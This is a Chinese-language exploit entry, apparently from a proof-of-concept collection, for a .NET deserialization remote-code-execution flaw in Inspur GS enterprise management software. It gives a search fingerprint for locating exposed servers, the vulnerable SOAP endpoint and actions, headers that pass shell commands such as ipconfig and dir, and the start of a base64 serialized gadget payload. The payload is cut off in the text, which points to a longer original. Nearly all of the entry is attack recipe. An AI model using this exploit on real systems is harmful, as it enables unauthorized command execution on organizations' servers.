# 浪潮GS企业管理软件多处.NET反序列化RCE漏洞

- **系统**：浪潮GS企业管理软件多处.NET　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/cwbase/web/scripts/jquery.js"`
- **请求**：`POST /cwbase/gsp/webservice/bizintegrationwebservice/bizintegrationwebservice.asmx HTTP/1.1`
- **关键头**：`Content-Type: text/xml; charset=utf-8`　`SOAPAction: "http://tempuri.org/GetChildFormAndEntityList"`　`cmd: ipconfig`　`Content-Type: text/xml; charset=utf-8`　`SOAPAction: "http://tempuri.org/SavePrintFormatAssign"`　`cmd: dir`　`c: \windows`

**请求体 / payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetChildFormAndEntityList xmlns="http://tempuri.org/">
<baseFormID>string</baseFormID>
<baseEntityID>string</baseEntityID>
<strFormAssignment>AAEAAAD/AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMA…（脚本共 32702 字，完整版见原文）
```